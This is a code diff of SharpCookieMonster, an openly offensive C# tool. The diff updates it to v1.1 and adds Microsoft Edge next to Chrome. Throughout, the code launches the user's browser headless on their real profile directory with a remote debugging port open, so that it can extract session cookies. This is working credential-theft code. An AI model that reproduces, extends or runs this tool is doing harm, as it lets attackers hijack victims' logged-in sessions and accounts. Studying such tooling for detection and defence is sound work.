@@ -48,10 +48,10 @@ namespace SharpCookieMonster
         private static void Main(string[] args)
         {
             Console.WriteLine(BANNER);
-            Console.WriteLine("                     SharpCookieMonster v1.0 by @m0rv4i\n");
+            Console.WriteLine("                     SharpCookieMonster v1.1 by @m0rv4i\n");
             if (args.Length == 1 && (args[0] == "-h" || args[0] == "--help"))
             {
-                Console.WriteLine("[*] SharpCookieMonster.exe [url] [chrome-debugging-port] [user-data-dir]");
+                Console.WriteLine("[*] SharpCookieMonster.exe [url] [edge|chrome] [debugging-port] [user-data-dir]");
                 return;
             }
 
@@ -61,23 +61,38 @@ namespace SharpCookieMonster
                 url = args[0];
                 Console.WriteLine("[*] Accessing site: " + url);
             }
-
-            var port = 9142;
-            if (args.Length >= 2)
+            
+            var edge = false;
+            if (args.Length == 2)
             {
-                port = int.Parse(args[1]);
-                Console.WriteLine("[*] Using chrome debugging port: " + port);
+                if (args[1].ToLower() == "edge")
+                {
+                    edge = true;
+                }
+            }
+            
+            var port = 9142;
+            if (args.Length >= 3)
+            {
+                port = int.Parse(args[2]);
+                Console.WriteLine("[*] Using debugging port: " + port);
             }
 
             var userdata = Environment.GetEnvironmentVariable("LocalAppData") + @"\Google\Chrome\User Data";
-            if (args.Length == 3)
+            if (edge)
             {
-                userdata = args[2];
+                userdata = Environment.GetEnvironmentVariable("LocalAppData") + @"\Microsoft\Edge\User Data";
+
+            }
+           
+            if (args.Length == 4)
+            {
+                userdata = args[3];
             }
 
             Console.WriteLine("[*] Using data path: " + userdata);
-            var chrome = LaunchChromeHeadless(url, userdata, port);
-            if (chrome == null)
+            var browserHeadless = LaunchBrowserHeadless(url, userdata, port, edge);
+            if (browserHeadless == null)
             {
                 // Ain't running - no point in continuing
                 return;
@@ -90,7 +105,7 @@ namespace SharpCookieMonster
             }
             finally
             {
-                Cleanup(chrome);
+                Cleanup(browserHeadless);
             }
 
             if (string.IsNullOrEmpty(cookies))
@@ -119,36 +134,46 @@ namespace SharpCookieMonster
 
         private static void LogData(object sender, DataReceivedEventArgs args)
         {
-            Console.WriteLine("[*][Chrome] {0}", args.Data);
+            Console.WriteLine("[*][Browser Logs] {0}", args.Data);
         }
 
-        private static Process LaunchChromeHeadless(string url, string userdata, int port)
+        private static Process LaunchBrowserHeadless(string url, string userdata, int port, bool edge)
         {
-            var chrome = new Process();
-            var chromes = Process.GetProcessesByName("chrome");
-            var path = @"C:\Program Files\Google\Chrome\Application\chrome.exe";
-            if (chromes.Length == 0)
+            var browser = "chrome";
+            if (edge)
             {
-                Console.WriteLine("[*] No chrome processes running, defaulting binary path to: " + path);
+                browser = "msedge";
+            }
+            
+            var browserProcess = new Process();
+            var browserProcesses = Process.GetProcessesByName(browser);
+            var path = @"C:\Program Files\Google\Chrome\Application\chrome.exe";
+            if (edge)
+            {
+                path = @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";
+            }
+            if (browserProcesses.Length == 0)
+            {
+                Console.WriteLine("[*] No browser processes running, defaulting binary path to: " + path);
             }
             else
             {
                 // Get the filepath of a running chrome process
-                path = chromes[0].MainModule?.FileName;
+                path = browserProcesses[0].MainModule?.FileName;
             }
 
-            chrome.StartInfo.UseShellExecute = false;
-            chrome.StartInfo.FileName = path;
-            chrome.StartInfo.Arguments = $"\"{url}\" --headless --user-data-dir=\"{userdata}\" --remote-debugging-port={port} --remote-allow-origins=ws://localhost:{port}";
-            chrome.StartInfo.CreateNoWindow = true;
-            chrome.OutputDataReceived += LogData;
-            chrome.ErrorDataReceived += LogData;
-            chrome.StartInfo.RedirectStandardOutput = true;
-            chrome.StartInfo.RedirectStandardError = true;
-            chrome.Start();
-            chrome.BeginOutputReadLine();
-            chrome.BeginErrorReadLine();
-            var pid = chrome.Id;
+            browserProcess.StartInfo.UseShellExecute = false;
+            browserProcess.StartInfo.FileName = path;
+            browserProcess.StartInfo.Arguments = $"\"{url}\" --headless --user-data-dir=\"{userdata}\" --remote-debugging-port={port} --remote-allow-origins=ws://localhost:{port}";
+            browserProcess.StartInfo.CreateNoWindow = true;
+            browserProcess.OutputDataReceived += LogData;
+            browserProcess.ErrorDataReceived += LogData;
+            browserProcess.StartInfo.RedirectStandardOutput = true;
+            browserProcess.StartInfo.RedirectStandardError = true;
+            browserProcess.Start();
+            browserProcess.BeginOutputReadLine();
+            browserProcess.BeginErrorReadLine();
+            var pid = browserProcess.Id;
             Thread.Sleep(1000);
             try
             {
@@ -156,11 +181,11 @@ namespace SharpCookieMonster
             }
             catch (ArgumentException)
             {
-                Console.WriteLine("[-] Launched chrome process is not running...will try connecting to port anyway");
+                Console.WriteLine("[-] Launched process is not running...will try connecting to port anyway");
             }
 
-            Console.WriteLine("[*] Started chrome headless process: " + pid);
-            if (WaitForPort(port)) return chrome;
+            Console.WriteLine("[*] Started headless process: " + pid);
+            if (WaitForPort(port)) return browserProcess;
             Console.WriteLine("[-] Timed out waiting for debug port to open...");
             return null;
         }
@@ -174,7 +199,7 @@ namespace SharpCookieMonster
                 var match = regex.Match(response);
                 if (!match.Success)
                 {
-                    Console.WriteLine("[-] Could not extract debug URL from chrome debugger service");
+                    Console.WriteLine("[-] Could not extract debug URL from debugger service");
                     return null;
                 }
 
@@ -186,19 +211,19 @@ namespace SharpCookieMonster
         }
 
 
-        private static void Cleanup(Process chrome)
+        private static void Cleanup(Process browserProcess)
         {
             try
             {
-                if (chrome == null) return;
-                chrome.ErrorDataReceived -= LogData;
-                chrome.OutputDataReceived -= LogData;
-                Console.WriteLine("[*] Killing process " + chrome.Id);
-                Process.GetProcessById(chrome.Id).Kill();
+                if (browserProcess == null) return;
+                browserProcess.ErrorDataReceived -= LogData;
+                browserProcess.OutputDataReceived -= LogData;
+                Console.WriteLine("[*] Killing process " + browserProcess.Id);
+                Process.GetProcessById(browserProcess.Id).Kill();
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error killing chrome process with pid {0}: {1}", chrome?.Id, e);
+                Console.WriteLine("[-] Error killing process with pid {0}: {1}", browserProcess?.Id, e);
             }
         }
 
